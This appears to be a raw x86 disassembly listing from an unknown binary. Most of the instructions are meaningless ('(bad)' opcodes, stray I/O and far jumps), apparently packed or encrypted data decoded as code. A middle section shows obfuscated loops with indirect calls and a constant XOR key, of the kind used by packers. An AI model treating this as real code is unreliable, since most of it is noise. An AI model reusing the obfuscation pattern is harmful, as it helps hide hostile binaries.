  40c56f:	les    edx,FWORD PTR [ecx+0x72c54b52]
  40c575:	sub    esi,DWORD PTR [eax-0xf]
  40c578:	mov    edi,0x71825406
  40c57d:	xchg   DWORD PTR [eax+0x70],esi
  40c580:	jb     0x40c601
  40c582:	jo     0x40c5f4
  40c584:	cmp    edi,eax
  40c586:	test   DWORD PTR [eax],0x172adee8
  40c58c:	sub    eax,0x77028089
  40c591:	rol    BYTE PTR [eax],1
  40c593:	call   0x71aa:0x73b373a
  40c59a:	(bad)  
  40c59b:	imul   edx,DWORD PTR [eax-0x4352fe5d],0x6d8a0d19
  40c5a5:	gs mov esp,0x7e82567a
  40c5ab:	shl    BYTE PTR [edi-0x4e4404ec],cl
  40c5b1:	push   cs
  40c5b2:	fwait
  40c5b3:	adc    cl,BYTE PTR [edx-0x21d3b56d]
  40c5b9:	mov    ah,0x74
  40c5bb:	je     0x1dcd1b08
  40c5c1:	aaa    
  40c5c2:	je     0x40c58d
  40c5c4:	fcomp  DWORD PTR [edx-0x5da2a0b5]
  40c5ca:	lods   al,BYTE PTR ds:[esi]
  40c5cb:	cs test al,0x28
  40c5ce:	xchg   BYTE PTR [ecx+0x4f],bh
  40c5d1:	adc    BYTE PTR [esi+0x6a16b7de],0x51
  40c5d8:	jbe    0x40c628
  40c5da:	ffree  st(1)
  40c5dc:	jmp    0x1fcffef9
  40c5e1:	scas   eax,DWORD PTR es:[edi]
  40c5e2:	cs pop esi
  40c5e4:	cmp    BYTE PTR [ebp-0x68],0xcc
  40c5e8:	popf   
  40c5e9:	cmp    edx,ebx
  40c5eb:	(bad)  
  40c5ec:	or     ah,ah
  40c5ee:	inc    esp
  40c5ef:	and    eax,DWORD PTR [ecx+0x666f63e2]
  40c5f5:	rcl    BYTE PTR ds:0x872d2939,1
  40c5fb:	cld    
  40c5fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5fd:	push   ebp
  40c5fe:	mov    ch,al
  40c600:	cmp    DWORD PTR [ebx],0x6081fdae
  40c606:	jne    0x40c621
  40c608:	pop    edx
  40c609:	icebp  
  40c60a:	retf   
  40c60b:	or     BYTE PTR [ecx-0x5c2edab5],ch
  40c611:	sbb    al,0x27
  40c613:	mov    ds:0x1c52a2c4,al
  40c618:	mov    cl,0xa3
  40c61a:	stos   DWORD PTR es:[edi],eax
  40c61b:	or     ah,BYTE PTR ds:0xf47f0e72
  40c621:	mov    bl,0x9
  40c623:	repz mov ecx,0x885c91f1
  40c629:	push   ebp
  40c62a:	xor    al,bl
  40c62c:	pop    ds
  40c62d:	lds    ax,DWORD PTR [eax]
  40c630:	and    al,0xb2
  40c632:	or     cl,bl
  40c634:	out    dx,eax
  40c635:	xor    al,0x13
  40c637:	ret    0xe1c5
  40c63a:	in     al,dx
  40c63b:	mov    ebp,0x2557365c
  40c640:	mov    bh,0xad
  40c642:	pop    edx
  40c643:	ret    0x7ad9
  40c646:	cmp    eax,0xf3460faf
  40c64b:	mov    ds:0xbfadca53,al
  40c650:	mov    edx,0xb265c8f8
  40c655:	push   es
  40c656:	sbb    eax,DWORD PTR [edi+0x4898de7d]
  40c65c:	fst    QWORD PTR [esi-0x20]
  40c65f:	jbe    0x40c601
  40c661:	push   ecx
  40c662:	mov    al,BYTE PTR [ebx]
  40c664:	sti    
  40c665:	mov    dh,0xab
  40c667:	jecxz  0x40c67e
  40c669:	cmp    DWORD PTR [ebp-0x50],eax
  40c66c:	or     BYTE PTR [edi],cl
  40c66e:	mov    esp,0x5e95a554
  40c673:	jl     0x40c6cd
  40c675:	call   0xf3efc297
  40c67a:	cmp    ah,BYTE PTR [eax+esi*4]
  40c67d:	mov    bh,0xcd
  40c67f:	pop    ebp
  40c680:	rcr    BYTE PTR [eax-0x8],cl
  40c683:	test   eax,0x1ef785f3
  40c688:	in     eax,dx
  40c689:	inc    ebx
  40c68a:	inc    eax
  40c68b:	and    ecx,0xaf12b960
  40c691:	popf   
  40c692:	pop    esi
  40c693:	seto   BYTE PTR [ebp-0x40]
  40c697:	aas    
  40c698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c699:	std    
  40c69a:	push   ss
  40c69b:	pandn  mm3,QWORD PTR [ebp-0x64b60270]
  40c6a2:	adc    ebx,eax
  40c6a4:	dec    esp
  40c6a5:	sub    al,0xca
  40c6a7:	push   ebp
  40c6a8:	(bad)
  40c6ac:	mov    cl,0x70
  40c6ae:	xchg   edi,eax
  40c6af:	add    DWORD PTR [edx+0x27a9529c],ebx
  40c6b5:	shl    esp,1
  40c6b7:	gs pop edx
  40c6b9:	mov    esp,0x9ba9ae5a
  40c6be:	sbb    BYTE PTR [eax+0x38],bl
  40c6c1:	ficom  DWORD PTR [edi+ecx*4-0x419c3c6e]
  40c6c8:	mov    esi,0x7b215189
  40c6cd:	arpl   si,dx
  40c6cf:	ror    BYTE PTR [edx+0x6b],1
  40c6d2:	out    dx,al
  40c6d3:	clc    
  40c6d4:	test   DWORD PTR cs:[edx-0x3c],ebp
  40c6d8:	mov    ebp,0xb1cdf2f
  40c6dd:	add    edx,DWORD PTR fs:[ebp-0x4e88ef1a]
  40c6e4:	daa    
  40c6e5:	adc    esi,eax
  40c6e7:	std    
  40c6e8:	rol    edx,0xc1
  40c6eb:	mov    ah,dh
  40c6ed:	loopne 0x40c75f
  40c6ef:	out    dx,eax
  40c6f0:	xor    BYTE PTR [esi-0x6b549e25],dl
  40c6f6:	or     dh,bl
  40c6f8:	retf   0xd08
  40c6fb:	out    0xa6,eax
  40c6fd:	ret    
  40c6fe:	iret   
  40c6ff:	xor    BYTE PTR [esi],al
  40c701:	in     eax,dx
  40c702:	push   ecx
  40c703:	xchg   edx,eax
  40c704:	in     al,0xa8
  40c706:	cld    
  40c707:	cmp    eax,esp
  40c709:	dec    edx
  40c70a:	aam    0x88
  40c70c:	cwde   
  40c70d:	push   cs
  40c70e:	pushf  
  40c70f:	or     BYTE PTR [ebx+0x4e],dh
  40c712:	retf   
  40c713:	test   eax,0x4fce70af
  40c718:	or     bh,BYTE PTR [ebx-0x7e]
  40c71b:	dec    esi
  40c71c:	jp     0x40c75f
  40c71e:	sbb    esp,DWORD PTR [ebx+eax*2]
  40c721:	(bad)  
  40c722:	cli    
  40c723:	out    0x98,eax
  40c725:	pop    esp
  40c726:	icebp  
  40c727:	push   edx
  40c728:	add    al,BYTE PTR [eax-0x356d2c5f]
  40c72e:	sar    esp,0xe4
  40c731:	adc    al,BYTE PTR [edi-0x38f4acbc]
  40c737:	inc    edi
  40c738:	inc    esp
  40c739:	retf   
  40c73a:	jge    0x40c78c
  40c73c:	adc    al,0xa9
  40c73e:	ss mov ch,0x4c
  40c741:	mov    ah,0xd8
  40c743:	ror    DWORD PTR [eax+0x7f51df0a],1
  40c749:	inc    esi
  40c74a:	xor    BYTE PTR [edi-0x50],bh
  40c74d:	push   ecx
  40c74e:	sub    al,0x46
  40c750:	jnp    0x40c79c
  40c752:	fstp   QWORD PTR [ecx]
  40c754:	and    BYTE PTR [edi+0x1],al
  40c757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c758:	ret    
  40c759:	ins    BYTE PTR es:[edi],dx
  40c75a:	mov    ch,0x4
  40c75c:	jae    0x40c753
  40c75e:	in     al,0xfe
  40c760:	idiv   DWORD PTR [edi+0x35]
  40c763:	add    al,0x3
  40c765:	ret    0xd5bf
  40c768:	ins    BYTE PTR es:[edi],dx
  40c769:	arpl   WORD PTR ds:0x2973b9e,ax
  40c76f:	cs enter 0x9ac4,0xe
  40c774:	mov    ?,ecx
  40c776:	xchg   edi,eax
  40c777:	out    dx,eax
  40c778:	aaa    
  40c779:	and    al,0xf5
  40c77b:	xor    eax,0xeec23d3d
  40c780:	jmp    0x72dcccc0
  40c785:	xor    al,BYTE PTR [eax]
  40c787:	leave  
  40c788:	ret    0x4
  40c78b:	push   ebp
  40c78c:	mov    ebp,esp
  40c78e:	mov    eax,ds:0x416224
  40c793:	mov    edx,0x32729c
  40c798:	and    DWORD PTR ds:0x434372,edi
  40c79e:	sub    eax,edx
  40c7a0:	and    DWORD PTR ds:0x432700,0x0
  40c7aa:	jmp    0x40c7bc
  40c7af:	mov    ecx,DWORD PTR ds:0x432700
  40c7b5:	inc    ecx
  40c7b6:	mov    DWORD PTR ds:0x432700,ecx
  40c7bc:	cmp    DWORD PTR ds:0x432700,0x1c
  40c7c3:	jae    0x40c8aa
  40c7c9:	cmp    DWORD PTR ds:0x432700,0x21
  40c7d0:	jne    0x40c7e4
  40c7d6:	push   0x432dc2
  40c7db:	push   DWORD PTR [ebp-0x1c]
  40c7de:	call   DWORD PTR ds:0x432d1e
  40c7e4:	jmp    0x40c7af
  40c7e9:	and    DWORD PTR ds:0x434386,0x0
  40c7f3:	jmp    0x40c805
  40c7f8:	mov    ecx,DWORD PTR ds:0x434386
  40c7fe:	inc    ecx
  40c7ff:	mov    DWORD PTR ds:0x434386,ecx
  40c805:	cmp    DWORD PTR ds:0x434386,0x1a
  40c80c:	jae    0x40c8aa
  40c812:	cmp    DWORD PTR ds:0x434386,0x9
  40c819:	jne    0x40c82d
  40c81f:	push   0x43441d
  40c824:	push   DWORD PTR [ebp-0x24]
  40c827:	call   DWORD PTR ds:0x4329ea
  40c82d:	cmp    DWORD PTR ds:0x434386,0x8
  40c834:	jne    0x40c847
  40c83a:	mov    ecx,DWORD PTR ds:0x434386
  40c840:	inc    ecx
  40c841:	mov    DWORD PTR ds:0x434386,ecx
  40c847:	jmp    0x40c7f8
  40c84c:	mov    DWORD PTR ds:0x4343a2,0x1c
  40c856:	cmp    DWORD PTR ds:0x4343a2,0x0
  40c85d:	je     0x40c8aa
  40c863:	cmp    DWORD PTR ds:0x4343a2,0xf
  40c86a:	jne    0x40c87c
  40c870:	push   DWORD PTR [ebp-0x14]
  40c873:	push   DWORD PTR [ebp-0x20]
  40c876:	call   DWORD PTR ds:0x432c66
  40c87c:	cmp    DWORD PTR ds:0x4343a2,0x10
  40c883:	jne    0x40c898
  40c889:	xor    ecx,ecx
  40c88b:	xor    ecx,DWORD PTR ds:0x4343a2
  40c891:	dec    ecx
  40c892:	mov    DWORD PTR ds:0x4343a2,ecx
  40c898:	mov    ecx,DWORD PTR ds:0x4343a2
  40c89e:	dec    ecx
  40c89f:	mov    DWORD PTR ds:0x4343a2,ecx
  40c8a5:	jmp    0x40c856
  40c8aa:	mov    ecx,0x7510855
  40c8af:	push   esi
  40c8b0:	mov    esi,DWORD PTR [ebp+0xc]
  40c8b3:	xor    eax,ecx
  40c8b5:	cmp    eax,esi
  40c8b7:	je     0x40d05a
  40c8bd:	mov    eax,ds:0x41621c
  40c8c2:	mov    esi,DWORD PTR [ebp+0xc]
  40c8c5:	sub    eax,edx
  40c8c7:	xor    eax,ecx
  40c8c9:	jmp    0x40cb3d
  40c8ce:	xchg   edi,eax
  40c8cf:	rol    DWORD PTR ds:0xb5744198,1
  40c8d5:	icebp  
  40c8d6:	lods   al,BYTE PTR ds:[esi]
  40c8d7:	add    al,0x98
  40c8d9:	rcl    ebp,0xf4
  40c8dc:	cmp    BYTE PTR ds:0x70708573,cl
  40c8e2:	leave  
  40c8e3:	jle    0x40c955
  40c8e5:	jo     0x40c8d0
  40c8e7:	sbb    bh,0xf3
  40c8ea:	aas    
  40c8eb:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40c8ed:	in     eax,dx
  40c8ee:	push   ss
  40c8ef:	jnp    0x40c8f1
  40c8f1:	retf   0x2399
  40c8f4:	mov    ah,0x46
  40c8f6:	xchg   esp,eax
  40c8f7:	lds    ebx,FWORD PTR [esi-0x6a]
  40c8fa:	cmp    cl,BYTE PTR [eax]
  40c8fc:	xchg   edx,eax
  40c8fd:	sub    edx,eax
  40c8ff:	push   edi
  40c900:	in     eax,dx
  40c901:	lods   eax,DWORD PTR ds:[esi]
  40c902:	cwde   
  40c903:	inc    eax
  40c904:	mov    al,ds:0x1aee90f3
  40c909:	adc    BYTE PTR [ebx-0x68],dl
  40c90c:	cli    
  40c90d:	hlt    
  40c90e:	dec    eax
  40c90f:	fs hlt 
  40c911:	sahf   
  40c912:	ins    DWORD PTR es:[edi],dx
  40c913:	fsub   st,st(1)
  40c915:	adc    ah,BYTE PTR [esi]
  40c917:	sar    bh,0x0
  40c91a:	push   ebp
  40c91b:	add    ebp,DWORD PTR [ecx-0x6c]
  40c91e:	inc    esp
  40c91f:	jecxz  0x40c90b
  40c921:	test   al,0x32
  40c923:	dec    esi
  40c924:	sub    ch,BYTE PTR [esi]
  40c926:	add    edx,DWORD PTR [eax+edi*4+0x38b6dca7]
  40c92d:	or     BYTE PTR [edx-0x42],cl
  40c930:	or     al,0x9d
  40c932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c933:	enter  0xff1a,0x29
  40c937:	mov    esi,ecx
  40c939:	mov    ebx,edi
  40c93b:	mov    edi,0x7cc2fff8
  40c940:	fcmovu st,st(4)
  40c942:	into   
  40c943:	mov    cl,0x62
  40c945:	popf   
  40c946:	out    dx,al
  40c947:	mov    BYTE PTR [edi+0x43163577],dh
  40c94d:	icebp  
  40c94e:	mov    ch,0x4f
  40c950:	xchg   BYTE PTR [edx],bl
  40c952:	shl    BYTE PTR [ebp+0x2ee61bce],0x64
  40c959:	sbb    dh,BYTE PTR [ebx+0x50]
  40c95c:	cmc    
  40c95d:	xchg   ebx,eax
  40c95e:	jns    0x40c95f
  40c960:	in     eax,0xac
  40c962:	mov    al,ds:0xd6208388
  40c967:	call   0xa733:0x1486bfe1
  40c96e:	jmp    0x40c9a3
  40c970:	or     BYTE PTR [edi-0x8bda6e1],ah
  40c976:	addr16 xchg esi,eax
  40c978:	pop    ebx
  40c979:	mov    bl,0xdb
  40c97b:	fimul  WORD PTR [edi-0x57]
  40c97e:	cmp    BYTE PTR [ecx+0x0],cl
  40c981:	jge    0x40c9ea
  40c983:	mov    cl,0xb4
  40c985:	test   DWORD PTR ds:0x8b652fa,esi
  40c98b:	(bad)  
  40c98d:	push   edi
  40c98e:	iret   
  40c98f:	retf   
  40c990:	dec    ebp
  40c991:	rcl    BYTE PTR [eax-0x16],1
  40c994:	jb     0x40c96c
  40c996:	or     ebx,ebx
  40c998:	loop   0x40c9ed
  40c99a:	out    dx,al
  40c99b:	mov    ecx,0x98f4d1b3
  40c9a0:	adc    BYTE PTR [ecx-0x53],bl
  40c9a3:	ja     0x40c99f
  40c9a5:	in     eax,dx
  40c9a6:	in     eax,dx
  40c9a7:	and    eax,0x3c3b2d24
  40c9ac:	xchg   ebp,eax
  40c9ad:	test   al,0x88
  40c9af:	out    0x5a,eax
  40c9b1:	mov    ch,cl
  40c9b3:	fcomp  QWORD PTR [ebx-0x7c]
  40c9b6:	cmp    bl,bl
  40c9b8:	call   0x5f74:0x8a42f244
  40c9bf:	add    esi,ecx
  40c9c1:	inc    esi
  40c9c2:	pop    edx
  40c9c3:	hlt    
  40c9c4:	lods   al,BYTE PTR ds:[esi]
  40c9c5:	or     eax,0xf9ad19e1
  40c9ca:	loop   0x40c991
  40c9cc:	lods   al,BYTE PTR ds:[esi]
  40c9cd:	pop    esi
  40c9ce:	push   ebp
  40c9cf:	ret    
  40c9d0:	ins    BYTE PTR es:[edi],dx
  40c9d1:	xchg   edi,eax
  40c9d2:	outs   dx,DWORD PTR ds:[esi]
  40c9d3:	xchg   BYTE PTR [edi+0x57309782],bh
  40c9d9:	push   0x78
  40c9db:	cmc    
  40c9dc:	jle    0x40c9ce
  40c9de:	xchg   edx,eax
  40c9df:	rcl    bl,0xf
  40c9e2:	mov    esp,0x95ac0da1
  40c9e7:	test   al,0x96
  40c9e9:	out    dx,eax
  40c9ea:	jae    0x40ca00
  40c9ec:	xchg   esp,eax
  40c9ed:	adc    al,0xb0
  40c9ef:	pop    edx
  40c9f0:	lods   al,BYTE PTR ds:[esi]
  40c9f1:	rol    esi,1
  40c9f3:	and    al,0x82
  40c9f5:	scas   al,BYTE PTR es:[edi]
  40c9f6:	mov    al,0xa0
  40c9f8:	sbb    DWORD PTR [edx],esi
  40c9fa:	sbb    ebx,DWORD PTR [edi-0x38]
  40c9fd:	xor    esi,DWORD PTR [ebx-0x5d]
  40ca00:	adc    ah,BYTE PTR [esi+0x28c2946e]
  40ca06:	outs   dx,BYTE PTR ds:[esi]
  40ca07:	and    edi,DWORD PTR [ebx-0x5f859520]
  40ca0d:	inc    eax
  40ca0e:	pop    edi
  40ca0f:	pmulhw mm0,QWORD PTR [ecx]
  40ca12:	dec    ecx
  40ca13:	loope  0x40ca78
  40ca15:	dec    DWORD PTR [ecx-0x9]
  40ca18:	jo     0x40ca6d
  40ca1a:	das    
  40ca1b:	std    
  40ca1c:	shl    BYTE PTR [ecx+ebx*2-0x64],cl
  40ca20:	(bad)  
  40ca21:	(bad)
  40ca24:	loopne 0x40c9ba
  40ca26:	mov    esi,0x906c5e07
  40ca2b:	add    BYTE PTR [ecx],bl
  40ca2d:	add    BYTE PTR [ebx-0x48dd881c],dl
  40ca33:	pop    ss
  40ca34:	push   ss
  40ca35:	aas    
  40ca36:	jb     0x40ca49
  40ca38:	and    dl,BYTE PTR [ecx-0x257a8d0e]
  40ca3e:	(bad)  
  40ca3f:	fs cs popf 
  40ca42:	mov    WORD PTR [ebp+0x4c],?
  40ca45:	mov    cl,0xca
  40ca47:	into   
  40ca48:	(bad)  
  40ca49:	dec    esi
  40ca4a:	sbb    DWORD PTR [esi+0x50],edi
  40ca4d:	js     0x40cab4
  40ca4f:	mov    ch,0x7
  40ca51:	repnz in al,0x49
  40ca54:	imul   DWORD PTR [ecx+ebp*4]
  40ca57:	mov    al,0xa4
  40ca59:	fstp   QWORD PTR [ebp+0x62]
  40ca5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca5d:	fistp  DWORD PTR [edx]
  40ca5f:	test   al,0xd2
  40ca61:	inc    ebx
  40ca62:	jae    0x40ca35
  40ca64:	mov    esp,0x677e1f0c
  40ca69:	(bad)  
  40ca6a:	mov    cl,0xea
  40ca6c:	test   BYTE PTR [edi+0x6bbac402],dl
  40ca72:	lea    esp,[eax]
  40ca74:	loope  0x40caec
  40ca76:	xor    al,0xc6
  40ca78:	data16 mov dh,0x96
  40ca7b:	push   ecx
  40ca7c:	bound  esi,QWORD PTR [ecx+0x2c]
  40ca7f:	call   0x640cd0f3
  40ca84:	imul   edi,ecx,0x345f363c
  40ca8a:	dec    ecx
  40ca8b:	(bad)  
  40ca8c:	repnz push 0x63
  40ca8f:	sbb    ah,ah
  40ca91:	inc    esi
  40ca92:	cmp    esi,DWORD PTR [ebx+0x38b18e1b]
  40ca98:	jbe    0x40cac1
  40ca9a:	(bad)  
  40ca9b:	or     edx,esi
  40ca9d:	sub    ch,BYTE PTR [esi+0x16127309]
  40caa3:	popf   
  40caa4:	xor    al,0x9c
  40caa6:	add    DWORD PTR [eax],ebp
  40caa8:	push   ds
  40caa9:	dec    eax
  40caaa:	pop    ebx
  40caab:	hlt    
  40caac:	xor    BYTE PTR [ecx-0x58],dl
  40caaf:	icebp  
  40cab0:	dec    ebx
  40cab1:	enter  0x73ed,0xbf
  40cab5:	inc    ebx
  40cab6:	inc    ecx
  40cab7:	jge    0x40ca52
  40cab9:	mov    esi,DWORD PTR [edx-0x61]
  40cabc:	pop    ss
  40cabd:	jmp    0x40cb2c
  40cabf:	jno    0x40cb0c
  40cac1:	mov    ah,0xd8
  40cac3:	mov    al,0x49
  40cac5:	fs jo  0x40cab7
  40cac8:	loopne 0x40cadc
  40caca:	sub    eax,0x91aa0471
  40cacf:	imul   ecx,DWORD PTR ds:0xb152ea9,0xad00b2b6
  40cad9:	lahf   
  40cada:	sbb    edi,DWORD PTR [ecx-0xb124be7]
  40cae0:	outs   dx,DWORD PTR ds:[esi]
  40cae1:	outs   dx,DWORD PTR ds:[esi]
  40cae2:	mov    esp,0x2264526f
  40cae7:	pushw  cs
  40cae9:	ret    0x4d14
  40caec:	test   edx,0xff66df79
  40caf2:	nop
  40caf3:	pop    esp
  40caf4:	(bad)  
  40caf5:	fwait
  40caf6:	sub    eax,0x19691eb2
  40cafb:	aam    0x7e
  40cafd:	das    
  40cafe:	sbb    ebx,DWORD PTR [ebx+0x12]
  40cb01:	(bad)
  40cb05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb06:	hlt    
  40cb07:	pop    eax
  40cb08:	jno    0x40ca9d
  40cb0a:	and    dh,BYTE PTR [edx+0x70]
  40cb0d:	jae    0x40ca95
  40cb0f:	xor    eax,0x4d9c6bed
  40cb14:	mov    edx,0xa496277f
  40cb19:	inc    edx
  40cb1a:	jnp    0x40cae3
  40cb1c:	or     DWORD PTR [ecx+0x3f],edi
  40cb1f:	aaa    
  40cb20:	sbb    DWORD PTR [ebx-0x211a005f],edx
  40cb26:	or     BYTE PTR [ecx+ebx*4],cl
  40cb29:	push   cs
  40cb2a:	loopne 0x40cb37
  40cb2c:	test   BYTE PTR [edx-0x6c4b9d1c],bl
  40cb32:	das    
  40cb33:	das    
  40cb34:	mov    ebp,?
  40cb36:	push   eax
  40cb37:	ret    0xfda3
  40cb3a:	inc    edi
  40cb3b:	inc    esp
  40cb3c:	jmp    0x10:0x850fc63b
  40cb43:	add    BYTE PTR [eax],al
  40cb45:	mov    eax,ds:0x416224
  40cb4a:	add    eax,DWORD PTR ds:0x41621c
  40cb50:	jmp    0x40d044
  40cb55:	mov    eax,DWORD PTR [ebp+0xc]
  40cb58:	xor    eax,ecx
  40cb5a:	jmp    0x40cdce
  40cb5f:	pop    ecx
  40cb60:	scas   al,BYTE PTR es:[edi]
  40cb61:	sbb    BYTE PTR [ebx-0xd],al
  40cb64:	push   ecx
  40cb65:	pop    ecx
  40cb66:	mov    dh,0xd4
  40cb68:	(bad)
  40cb6b:	cmp    edi,DWORD PTR [eax]
  40cb6d:	int3   
  40cb6e:	ins    BYTE PTR es:[edi],dx
  40cb6f:	int3   
  40cb70:	xor    BYTE PTR [eax+0x70],0xc9
  40cb74:	jle    0x40cbe6
  40cb76:	jo     0x40cb8a
  40cb78:	sbb    BYTE PTR [ebx],cl
  40cb7a:	bound  edx,QWORD PTR [eax]
  40cb7c:	cmc    
  40cb7d:	dec    esp
  40cb7e:	sbb    cl,BYTE PTR [eax]
  40cb80:	and    al,0x28
  40cb82:	sub    al,0x5f
  40cb84:	das    
  40cb85:	(bad)
  40cb88:	pop    eax
  40cb89:	mov    dl,BYTE PTR [edx+ebp*4+0x6a848c88]
  40cb90:	xchg   DWORD PTR [ebx+0x14],edi
  40cb93:	inc    eax
  40cb94:	jmp    0x2383:0x16da121f
  40cb9b:	inc    esp
  40cb9c:	popf   
  40cb9d:	in     al,0xf6
  40cb9f:	dec    edi
  40cba0:	jnp    0x40cb43
  40cba2:	sbb    ah,bh
  40cba4:	add    DWORD PTR [ecx],esp
  40cba6:	loop   0x40cbe9
  40cba8:	loopne 0x40cb48
  40cbaa:	cwd    
  40cbac:	push   0x6
  40cbae:	aad    0xd5
  40cbb0:	xor    bh,ah
  40cbb2:	ficom  WORD PTR [ecx]
  40cbb4:	pop    ebx
  40cbb5:	add    al,0x60
  40cbb7:	inc    edx
  40cbb8:	mov    al,0x91
  40cbba:	leave  
  40cbbb:	test   BYTE PTR [esi],al
  40cbbd:	push   0xffffff9d
  40cbbf:	jmp    0xf8cac5f
  40cbc4:	dec    edi
  40cbc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbc6:	inc    edx
  40cbc7:	fist   DWORD PTR [edx]
  40cbc9:	and    al,0x94
  40cbcb:	or     al,0x5
  40cbcd:	out    0xfe,al
  40cbcf:	xlat   BYTE PTR ds:[ebx]
  40cbd0:	(bad)  
  40cbd1:	pusha  
  40cbd2:	push   ecx
  40cbd3:	cld    
  40cbd4:	jbe    0x40cc3a
  40cbd6:	aaa    
  40cbd7:	hlt    
  40cbd8:	pop    ss
  40cbd9:	in     al,dx
  40cbda:	or     eax,0x2169cae4
  40cbdf:	test   al,0x57
  40cbe1:	mov    edi,0x8a79511b
  40cbe6:	push   ebx
  40cbe7:	mov    ebx,0x51e7f875
  40cbec:	dec    ecx
  40cbed:	repnz lahf 
  40cbef:	outs   dx,BYTE PTR ds:[esi]
  40cbf0:	cmp    eax,esi
  40cbf2:	mov    ecx,0x36ec62ee
  40cbf7:	test   DWORD PTR [edi],0xf2c79fbd
  40cbfd:	jno    0x40cb84
  40cbff:	imul   ecx,DWORD PTR [eax],0xec008109
  40cc05:	pop    eax
  40cc06:	out    0xe9,al
  40cc08:	and    BYTE PTR [esi-0x59fcacd5],bh
  40cc0e:	mov    esi,0x9be26866
  40cc13:	ds push es
  40cc15:	push   ebp
  40cc16:	dec    ebx
  40cc17:	add    eax,0x2dc5e78e
  40cc1c:	neg    BYTE PTR [ebp+0x6b]
  40cc1f:	(bad)  
  40cc20:	mov    WORD PTR ds:0x4e9435a9,gs
  40cc26:	pop    edx
  40cc27:	dec    esi
  40cc28:	out    dx,eax
  40cc29:	and    DWORD PTR [ebx+0x13504d52],eax
  40cc2f:	jb     0x40cbb8
  40cc31:	das    
  40cc32:	dec    eax
  40cc33:	das    
  40cc34:	add    al,dl
  40cc36:	mov    esp,0x2c62987
  40cc3b:	inc    ebp
  40cc3c:	(bad)  
  40cc3e:	call   0x1d1c:0x816b8002
  40cc45:	enter  0x7f3b,0x72
  40cc49:	loop   0x40cc90
  40cc4b:	inc    edi
  40cc4c:	adc    BYTE PTR [ecx+0x6c],ah
  40cc4f:	div    BYTE PTR [esi]
  40cc51:	inc    esp
  40cc52:	ins    BYTE PTR es:[edi],dx
  40cc53:	inc    esp
  40cc54:	call   0x2481e0aa
  40cc59:	call   0x7bef:0xaa028028
  40cc60:	lds    ebp,FWORD PTR [esi+ecx*4+0x6a4ad270]
  40cc67:	mov    ds:0x9d25fbf7,al
  40cc6c:	sbb    eax,0x19dc5e73
  40cc71:	cmc    
  40cc72:	arpl   WORD PTR cs:[ecx],bx
  40cc75:	rcl    DWORD PTR ds:0xbef15e77,0x2f
  40cc7c:	sti    
  40cc7d:	dec    ebx
  40cc7e:	bound  esp,QWORD PTR [ebx]
  40cc80:	shl    DWORD PTR [ebp+0x4316187e],1
  40cc86:	ret    0x7b0d
  40cc89:	call   0x67c809d5
  40cc8e:	mov    BYTE PTR [esi+ebx*4+0x6a],0x27
  40cc93:	pop    ebx
  40cc94:	daa    
  40cc95:	inc    edi
  40cc96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc97:	adc    dh,BYTE PTR [ebp+0x1051dfd9]
  40cc9d:	hlt    
  40cc9e:	out    dx,al
  40cc9f:	or     BYTE PTR [edx+edi*2-0x57],al
  40cca3:	jmp    0x8830:0xddcbace0
  40ccaa:	scas   al,BYTE PTR es:[edi]
  40ccab:	mov    dh,0x74
  40ccad:	add    DWORD PTR [esi+0x52],esi
  40ccb0:	retf   0xcda
  40ccb3:	std    
  40ccb4:	stc    
  40ccb5:	pop    ebx
  40ccb6:	add    eax,0x57
  40ccb9:	ins    DWORD PTR es:[edi],dx
  40ccba:	into   
  40ccbb:	mov    BYTE PTR [edi+0x7b],ch
  40ccbe:	sbb    bh,ch
  40ccc0:	(bad)  
  40ccc2:	mov    WORD PTR ds:0xf7d85c14,fs
  40ccc8:	add    al,0x7c
  40ccca:	test   al,0x6d
  40cccc:	shl    al,cl
  40ccce:	iret   
  40cccf:	cmc    
  40ccd0:	stos   BYTE PTR es:[edi],al
  40ccd1:	xchg   ebx,eax
  40ccd2:	sbb    edx,esi
  40ccd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccd5:	rol    BYTE PTR [ebx+0x6db01e10],0x5d
  40ccdc:	pop    esp
  40ccdd:	mov    ds:0x7f2ba3bf,eax
  40cce2:	(bad)  
  40cce3:	sti    
  40cce4:	cmc    
  40cce5:	test   dl,dl
  40cce7:	loop   0x40cd57
  40cce9:	test   BYTE PTR [ebx+eiz*2],0x8d
  40cced:	xchg   edx,eax
  40ccee:	jp     0x40cc80
  40ccf0:	test   BYTE PTR [edx-0x36],ah
  40ccf3:	dec    esi
  40ccf4:	aam    0xa3
  40ccf6:	or     al,0xf4
  40ccf8:	mov    ch,0xf7
  40ccfa:	push   0x34
  40ccfc:	inc    edx
  40ccfd:	retf   0xe567
  40cd00:	mov    cl,0x36
  40cd02:	pop    esi
  40cd03:	xor    DWORD PTR [esi+ebp*1],ebx
  40cd06:	je     0x40cd20
  40cd08:	or     dl,cl
  40cd0a:	adc    dl,BYTE PTR [edi+0x1a]
  40cd0d:	jno    0x40cc91
  40cd0f:	fs and al,0xa7
  40cd12:	push   es
  40cd13:	cmp    esi,ebp
  40cd15:	ret    0x4727
  40cd18:	lahf   
  40cd19:	add    esi,DWORD PTR [esi-0x4a29b705]
  40cd1f:	fwait
  40cd20:	pop    ss
  40cd21:	test   DWORD PTR [ecx-0x7b],ebp
  40cd24:	test   eax,0x312470de
  40cd29:	int    0xde
  40cd2b:	add    DWORD PTR gs:[ebp-0x7ef56817],0xffffffe5
  40cd33:	loopne 0x40cd1d
  40cd35:	ja     0x40ccea
  40cd37:	pop    ecx
  40cd38:	fld    QWORD PTR [esi]
  40cd3a:	inc    ebp
  40cd3b:	pop    ss
  40cd3c:	adc    DWORD PTR [edx-0x45],ecx
  40cd3f:	add    ch,bl
  40cd41:	fadd   QWORD PTR [edx]
  40cd43:	inc    eax
  40cd44:	jmp    0xead6:0xad4bac20
  40cd4b:	or     DWORD PTR [ebx],0x9962798
  40cd51:	pop    ecx
  40cd52:	fnstenv [ebp+0x42fc8a5e]
  40cd58:	shl    DWORD PTR [edx-0xe],1
  40cd5b:	adc    bl,BYTE PTR [eax+0x313c052]
